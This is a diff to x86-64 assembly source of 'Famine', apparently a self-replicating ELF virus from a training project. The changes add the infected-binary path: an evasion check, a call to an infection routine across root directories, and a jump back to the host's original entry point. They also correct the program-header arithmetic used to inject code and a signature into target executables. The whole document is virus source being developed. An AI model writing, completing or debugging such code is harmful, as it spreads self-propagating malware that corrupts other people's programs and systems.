@@ -20,26 +20,45 @@ signature db `Famine version 1.0 (c)oded by <jng>-<gdaryl>`,0
 _start:
 
 main:
+	; NOTE: RDX NEEDS TO BE RESTORED FOR THE CHILD
     ; mprotect start to end labels to be RWX
+    push rdx
     mov rax, SYS_MPROTECT
     lea rdi, [rel _start]
     lea rsi, [rel _end]
     sub rsi, rdi
     mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
     syscall
+    pop rdx
 
 	; branch for infected file running or running patient 0
     cmp qword [rel ent_vaddr_gap], 0
     je mother
 
 infected:
-    ; TODO: if run as infected, run the same routine as mother
-    ; but modify evasion routine and jump to entry address afterward
-    mov rax, 0x0000006f6c6c6568
-    push rax
-    mov rdi, rsp
-    call write_string_nl
-    add rsp, 8
+	; run evasion routine. If tripped, just jmp to entry
+    push rdx
+    call evasion_routine
+    pop rdx
+
+    test rax, rax
+    jz .jmp_to_og_entry
+
+    ; run infection routine
+    push rdx
+    lea rdi, [rel root_dirs]
+    call infection_routine
+    pop rdx
+
+.jmp_to_og_entry:
+    ; jmp to original entry
+    lea rax, [rel _start]
+    mov rdi, qword [rel ent_vaddr_gap]
+    shr rdi , 8 ; NOTE: woah wtf is this? plz explain why 
+    
+    sub rax, rdi
+    jmp rax
+    
     jmp exit_ok
 
 mother:
@@ -53,7 +72,7 @@ mother:
     ; infection routine
     lea rdi, [rel root_dirs]
     call infection_routine
-    jmp exit_err
+    jmp exit_ok
 
     ; lea r8, [rel _end] ; end addr
     ; lea r9, [rel _start]; start addr
@@ -430,7 +449,7 @@ infect_single_file:
 
 
     ; iterate the program header, see which segment is the entry point (usually is load segment with RX)
-    ; calculate entry point offset (entry vaddr - pheader.vaddr)
+    ; calculate entry point offset (entry vaddr - pheader.vaddr) wait no
     push rcx
     call get_entry_offset
     pop rcx
@@ -502,12 +521,6 @@ infect_single_file:
     call patching_pass
     pop rsi
 
-    ; TODO: check with ls
-
-    ; check next program header (segment) comes next, and calulate space avail ((pheader_nxt.offset) - (pheader_curr.offset + size))
-    ; if smaller than _end - _start, (WAIT NO)
-
-
 .close_munmap:
     mov rdi, r8
     mov rax, SYS_CLOSE
@@ -539,12 +552,14 @@ infect_single_file:
 check_infected:
     add rdi, rsi
     mov rsi, rdi ; mmap buffer + entry_offset -> rsi
+    call break ; check arithmetic is OK
 
     lea rdi, [rel signature]
     call strlen
 
     sub rsi, rax
-    mov rdx, 10 ; just compare 10 bytes only lah
+    mov rdx, 5 ; just compare 5 bytes only lah
+    call break ; check if values are OK
     call memcmp
 
     test rax, rax
@@ -580,8 +595,8 @@ get_entry_offset:
     ; vaddr -> rdx 
     mov rdx, qword [rdi + 0x10]
     
-    ; vaddr + file size -> rcx
-    mov rcx, qword [rdi + 0x20]
+    ; vaddr + mem size -> rcx
+    mov rcx, qword [rdi + 0x28]
     add rcx, rdx
 
     ; cmp  in range? if yes, set rax to pheader offset + remainder and jump to loop end
@@ -592,11 +607,10 @@ get_entry_offset:
     cmp r8, rcx
     jge .loop_iter
 
-    ; TODO: maybe simplify this instruction?
-	; entry_vaddr - vaddr -> r8
-    sub r8, qword [rdi + 0x08]
+    ; entry offset = pheader file offset from rdi + (entrypoint from r8 - pheader.vaddr from rdi)
     mov rax, qword [rdi + 0x08]
     add rax, r8
+    sub rax, qword [rdi + 0x10]
     
     jmp .loop_end
 
@@ -675,6 +689,10 @@ patching_pass:
     sub rax , 1 ; NOTE: 1 character offset
     add rbx, rax ; new entry -> rbx
     
+    ; rdi - pheader in question
+    ; rsi - old entry
+    ; rcx - new entry
+    ; rdx - mmap buf
     ; write parameters and signature
     push rdi
     mov rsi, r8
@@ -704,7 +722,7 @@ patching_pass:
 
     ; get file offset of segment
     mov rax, qword [rdi + 0x08]
-    add rax, qword [rdi + 0x28]  ; segment file offset + size -> rax
+    add rax, qword [rdi + 0x20]  ; segment file offset + file size -> rax
 
     ; locate section header for start offset
     mov rdi, r9
@@ -724,7 +742,6 @@ patching_pass:
     ; adjusted offset -> rdx
     mov rdx, qword [rdi + 0x18]
     add rdx, MAX_FILE_PAD
-    add rdx, 10 ; NOTE: hacky equal offset fix. TODO: inspect this.
 
     ; is it bigger than segment file offset + size rax?
     cmp rdx, rax
@@ -783,20 +800,23 @@ write_params:
 	push rbx
     push r8
 
-
 	; calculate offset to write in file
     ; account for uninitialized extra mem space
     mov r8, qword [rdi + 0x8]
     add r8, qword [rdi + 0x28] ; file offset at edge -> r8
 
-    ; calculate entry gap from _start (incl param + signature gap)
-    mov rbx, rcx
-    sub rbx, qword [rdi + 0x10]
-    sub rbx, qword [rdi + 0x28] ; diff between new entry and vaddr edge (param + signature gap) -> rbx
+    ; ; calculate entry gap from _start (incl param + signature gap)
+    ; mov rbx, rcx
+    ; sub rbx, qword [rdi + 0x10]
+    ; sub rbx, qword [rdi + 0x28] ; diff between new entry and vaddr edge (param + signature gap) -> rbx
+
+    ; mov rax, rcx
+    ; sub rax, rsi
+    ; add rax, rbx ; entry gap -> rax
 
     mov rax, rcx
-    sub rax, rsi
-    add rax, rbx ; entry gap -> rax
+    sub rcx, rsi
+    mov rax, rcx
 
     add rdx, r8
     mov qword [rdx], rax
